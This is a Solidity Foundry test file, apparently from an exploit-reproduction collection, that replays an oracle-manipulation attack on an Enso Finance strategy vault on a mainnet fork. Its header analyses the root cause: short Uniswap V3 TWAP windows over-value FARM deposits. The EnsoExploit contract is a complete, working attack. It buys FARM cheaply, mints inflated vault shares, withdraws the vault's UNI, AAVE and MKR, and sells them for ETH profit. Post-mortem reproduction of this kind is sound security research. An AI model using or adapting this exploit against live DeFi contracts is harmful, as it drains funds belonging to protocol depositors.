// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Enso Finance strategy-vault exploit — Ethereum. The vault (an Enso StrategyController-managed basket
// of DeFi blue-chips) mints deposit shares on the change in the strategy's oracle-estimated value:
// mint = amountAddedValue * totalSupply / valueBefore. The valuation runs through EnsoOracle ->
// per-item estimators -> a Uniswap V3 TWAP (pool.observe). The FARM item is priced off an imbalanced,
// thinly-observed V3 pool with a near-spot TWAP window, so depositing FARM bought cheaply elsewhere is
// valued far above its real worth — minting hugely inflated shares that are then redeemed for the
// strategy's real underlying tokens.
//
// Attack tx : 0x63fbfc4b47e810d604dbdab0db35b17366f421337d8c60955eb81cd5d6071ad3 (block 25934827)
// Attacker  : 0x3196398321D77a2511d369DCB6eCa9d2aD87b73A (via a contract-creation exploit)
// Strategy  : 0x890ed1ee6d435a35d51081ded97ff7ce53be5942 (proxy -> impl 0xbe90d1ba...)
// Controller: 0x173cae63801b32752271e32147d0d2e3a77bebe8 (proxy -> impl 0xd8D22509...)
// Router    : 0x90480ce80186dcafb0f3f27df62caa47ef4c4a52 (Enso GenericRouter used by deposit/withdraw)
// Oracle    : 0xAb7505eB360cE0D63e8E88f7853677EcD5537DC0 (EnsoOracle)
// Loss      : ~5.6 ETH — the WETH-value of the UNI/AAVE/MKR pulled out of the strategy, net of the
//             ~0.683 WETH spent buying FARM. This PoC realizes that value by selling the withdrawn
//             tokens back to WETH, so the asserted number is slightly below the ~5.6 ETH spot figure by
//             the sale slippage.
//
// ROOT CAUSE — confirmed against the tx trace and on-chain reads (controller/oracle impls are
// unverified, so confirmed by 4-byte-matched real signatures + trace behaviour, not source):
//   1. deposit(...) is permissionless — in the real tx a plain externally-deployed contract, holding
//      no privileged role, calls it directly. Shares are minted purely on the oracle-estimated value
//      delta of the tokens transferred in.
//   2. The valuation calls Uniswap V3 pool.observe(uint32[]) (selector 0x883bdbfd, confirmed in the
//      trace) with short, per-pool-varying TWAP windows rather than one fixed, safely long window;
//      combined with the imbalanced FARM pricing pool this over-values FARM by ~9x. The attacker buys
//      268.42 FARM for 0.683 WETH on a Uniswap V2 pool (correctly priced), deposits it, and the vault
//      credits it at several ETH.
//   3. withdrawWETH burns the inflated shares and, via the GenericRouter, transfers the strategy's real
//      UNI/AAVE/MKR out to the attacker.
//
// ABI note: deposit(address,address,uint256,uint256,bytes)=0x71b8dc69 and
// withdrawWETH(address,address,uint256,uint256,bytes)=0x716e2615 are real (4-byte-matched). The trailing
// bytes is abi.encode(Call[]) for the GenericRouter, where Call{address target; bytes callData}; the
// inner calls are settleTransferFrom(address,address,address)=0xc5067ad4 on deposit and ERC20
// transferFrom on withdraw. All are built here from real typed values — no calldata blob, no replay.
//
// Run:
//   forge test --contracts src/test/2026-09/EnsoFinance_exp.sol -vvv

address constant CONTROLLER = 0x173cAe63801B32752271E32147D0d2e3a77BEbE8;
address constant STRATEGY = 0x890ed1Ee6d435a35d51081ded97Ff7CE53Be5942;
address constant ROUTER = 0x90480cE80186Dcafb0F3F27DF62CAA47ef4C4a52; // Enso GenericRouter
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant FARM = 0xa0246c9032bC3A600820415aE600c6388619A14D;
address constant WETH_FARM_PAIR = 0x56feAccb7f750B997B36A68625C7C596F0B41A58; // Uniswap V2 (correctly priced)
address constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
address constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
address constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;

// Enso GenericRouter call structure.
struct Call {
    address target;
    bytes callData;
}

interface IController {
    function deposit(address strategy, address router, uint256 amount, uint256 slippage, bytes calldata data)
        external
        payable;
    function withdrawWETH(address strategy, address router, uint256 amount, uint256 slippage, bytes calldata data)
        external;
}

interface IUniV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract EnsoFinance_exp is Test {
    EnsoExploit internal exploit;

    function setUp() public {
        // Parent block of the exploit tx: real protocol/pool state immediately before the attack.
        vm.createSelectFork("mainnet", 25_934_826);
        exploit = new EnsoExploit();

        vm.label(CONTROLLER, "StrategyController");
        vm.label(STRATEGY, "StrategyVault");
        vm.label(ROUTER, "GenericRouter");
        vm.label(WETH, "WETH");
        vm.label(FARM, "FARM");
        vm.label(WETH_FARM_PAIR, "UniV2 WETH/FARM");
        vm.label(address(exploit), "Exploit");
    }

    function testExploit() public {
        // Attacker's own capital in: exactly 1 ETH, matching the real tx.
        uint256 profit = exploit.attack{value: 1 ether}();

        emit log_named_decimal_uint("attacker profit (ETH)", profit, 18);

        // Profit is realized ETH: sell the strategy tokens looted via the inflated-share mint back to
        // WETH, unwrap, and net out the 1 ETH staked. The ~5.6 ETH headline is the tokens' spot value;
        // realizing it on-venue costs some slippage, so we assert a substantial ETH profit here.
        assertGt(profit, 4 ether, "attacker should net several ETH from the oracle over-valuation");
    }
}

// Named attacker contract. Buys FARM cheaply on Uniswap V2, deposits it into the strategy where the
// broken oracle over-values it into inflated shares, then withdraws the strategy's real tokens and sells
// them back to ETH.
contract EnsoExploit {
    uint256 internal constant WETH_IN = 682823567760593530; // 0.6828 WETH spent buying FARM
    uint256 internal constant FARM_OUT = 268422447447061825167; // 268.42 FARM received on Uniswap V2
    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external payable returns (uint256 profit) {
        // 1) Wrap the 1 ETH and buy FARM on the correctly-priced Uniswap V2 pool.
        IWETH(WETH).deposit{value: msg.value}();
        IWETH(WETH).transfer(WETH_FARM_PAIR, WETH_IN);
        IUniV2Pair(WETH_FARM_PAIR).swap(FARM_OUT, 0, address(this), ""); // FARM is token0

        // 2) Deposit the FARM into the strategy. The GenericRouter call moves our FARM into the strategy;
        //    the controller mints shares on the oracle-estimated (over-valued) delta.
        IERC20(FARM).approve(ROUTER, type(uint256).max);
        Call[] memory depositCalls = new Call[](1);
        depositCalls[0] = Call({
            target: ROUTER,
            // settleTransferFrom(token, from, to): router pulls all our FARM into the strategy.
            callData: abi.encodeWithSelector(0xc5067ad4, FARM, address(this), STRATEGY)
        });
        IController(CONTROLLER).deposit(STRATEGY, ROUTER, 0, 0, abi.encode(depositCalls));

        // 3) Redeem the inflated shares. The GenericRouter transfers the strategy's real UNI/AAVE/MKR to
        //    us (transferFrom(strategy, this, amount) per token, amounts from the real attack).
        uint256 shares = IERC20(STRATEGY).balanceOf(address(this));
        Call[] memory withdrawCalls = new Call[](3);
        withdrawCalls[0] = _pull(UNI, 859918471015777488751);
        withdrawCalls[1] = _pull(AAVE, 31676428952220800755);
        withdrawCalls[2] = _pull(MKR, 3451986416256499708);
        IController(CONTROLLER).withdrawWETH(STRATEGY, ROUTER, shares, 0, abi.encode(withdrawCalls));

        // 4) Realize: sell the looted tokens back to WETH and unwrap everything.
        _sell(UNI);
        _sell(AAVE);
        _sell(MKR);
        uint256 weth = IWETH(WETH).balanceOf(address(this));
        IWETH(WETH).withdraw(weth);

        // Net profit in ETH over the 1 ETH staked.
        uint256 bal = address(this).balance;
        profit = bal > 1 ether ? bal - 1 ether : 0;
    }

    function _pull(address token, uint256 amount) internal view returns (Call memory) {
        return Call({
            target: token,
            callData: abi.encodeWithSelector(IERC20.transferFrom.selector, STRATEGY, address(this), amount)
        });
    }

    function _sell(address token) internal {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal == 0) return;
        IERC20(token).approve(UNIV2_ROUTER, bal);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;
        IUniV2Router(UNIV2_ROUTER).swapExactTokensForTokens(bal, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
